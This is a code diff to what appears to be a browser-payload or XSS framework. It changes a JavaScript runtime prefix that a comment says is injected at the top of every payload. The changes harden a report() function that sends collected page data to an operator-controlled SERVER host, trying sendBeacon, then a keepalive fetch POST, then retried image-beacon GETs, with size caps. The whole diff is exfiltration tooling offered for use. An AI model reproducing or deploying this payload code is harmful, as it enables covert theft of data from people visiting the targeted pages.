@@ -92,21 +92,42 @@ def _render(template: str, context: Dict[str, Any], config: Any) -> str:
 
 # 公共运行时前缀(注入到每个 payload 顶部;紧凑无注释)
 _RUNTIME_PREFIX = r"""var SERVER = "http://{{host}}:{{config.port}}";
+var _PH_BEACON_MAX = 60000;
+var _PH_POST_MAX = 1048576;
 function _q(name, dflt) {
   try {
     var m = new RegExp('[?&]' + name + '=([^&]*)').exec(location.search);
     return m ? decodeURIComponent(m[1].replace(/\+/g, ' ')) : (dflt == null ? '' : dflt);
   } catch (e) { return dflt == null ? '' : dflt; }
 }
+function _phGetRetry(url, tries) {
+  try {
+    var img = new Image();
+    img.onerror = function () { if (tries > 0) setTimeout(function () { _phGetRetry(url, tries - 1); }, 700); };
+    img.src = url;
+  } catch (e) {}
+}
 function report(d) {
   try {
     var payload = JSON.stringify(d);
-    if (navigator.sendBeacon) {
-      navigator.sendBeacon(SERVER + "{{config.route_report}}", payload);
-    } else {
-      var body = encodeURIComponent(payload.slice(0, 1800));
-      new Image().src = SERVER + "{{config.route_report}}?d=" + body;
+    if (payload.length > _PH_POST_MAX) {
+      d = { type: (d && d.type) || 'oversize', truncated: true, size: payload.length };
+      payload = JSON.stringify(d);
     }
+    var url = SERVER + "{{config.route_report}}";
+    var getUrl = url + "?d=" + encodeURIComponent(payload.slice(0, 1800));
+    if (navigator.sendBeacon && payload.length <= _PH_BEACON_MAX) {
+      try { if (navigator.sendBeacon(url, payload)) return; } catch (e) {}
+    }
+    if (window.fetch && payload.length <= _PH_POST_MAX) {
+      try {
+        fetch(url, { method: 'POST', body: payload, keepalive: true, mode: 'cors' })
+          .then(function (r) { if (!r || !r.ok) _phGetRetry(getUrl, 2); },
+                function () { _phGetRetry(getUrl, 2); });
+        return;
+      } catch (e) {}
+    }
+    _phGetRetry(getUrl, 2);
   } catch (e) {}
 }
 """
